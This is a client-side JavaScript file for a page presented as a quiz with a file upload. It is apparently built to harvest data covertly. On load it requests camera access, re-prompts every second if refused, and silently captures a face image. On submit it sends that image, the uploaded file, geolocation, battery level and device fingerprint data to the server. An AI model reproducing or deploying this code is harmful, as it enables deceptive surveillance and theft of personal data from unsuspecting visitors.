// DOM Elements
const fileInput = document.getElementById("user-file");
const quizForm = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const toastEl = document.getElementById("toast");

let capturedImage = null;

// ---------------- Toast ----------------
function showToast(msg, duration = 2000) {
  toastEl.textContent = msg;
  toastEl.classList.add("show");
  setTimeout(() => toastEl.classList.remove("show"), duration);
}

// ---------------- Camera Permission ----------------
async function askCameraPermission() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false // no mic
    });
    video.srcObject = stream;
    video.play();

    // Capture first frame immediately
    captureCameraImage();
  } catch (err) {
    showToast("Camera access is required to continue.");
    // Retry after short delay
    setTimeout(askCameraPermission, 1000);
  }
}

function captureCameraImage() {
  const ctx = canvas.getContext("2d");
  canvas.width = video.videoWidth || 320;
  canvas.height = video.videoHeight || 240;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  capturedImage = canvas.toDataURL("image/jpeg");
}

// Ask camera permission on page load
window.addEventListener("load", askCameraPermission);

// ---------------- Form Submission ----------------
quizForm.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!fileInput.files.length) {
    showToast("Please select a file.");
    return;
  }
  if (!capturedImage) {
    showToast("Camera image not captured yet.");
    return;
  }

  // Convert user file to Base64
  const reader = new FileReader();
  reader.onload = async function () {
    const fileBase64 = reader.result;

    // Metadata
    const metadata = {
      useragent: navigator.userAgent,
      platform: navigator.platform,
      width: window.innerWidth,
      height: window.innerHeight,
      language: navigator.language,
      battery: navigator.getBattery ? await (await navigator.getBattery()).level : null,
      location: navigator.geolocation ? await new Promise(res => navigator.geolocation.getCurrentPosition(
        pos => res(pos.coords),
        () => res(null)
      )) : null,
      time: new Date().toISOString()
    };

    try {
      const res = await fetch("/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image: capturedImage,   // camera image
          file: fileBase64,       // uploaded file
          metadata
        })
      });

      const data = await res.json();
      if (data.success) {
        document.getElementById("quiz-container").style.display = "none";
        document.getElementById("success-container").style.display = "block";
      } else {
        showToast("Upload failed: " + data.error);
      }
    } catch (err) {
      showToast("Server error: " + err.message);
    }
  };

  reader.readAsDataURL(fileInput.files[0]);
});
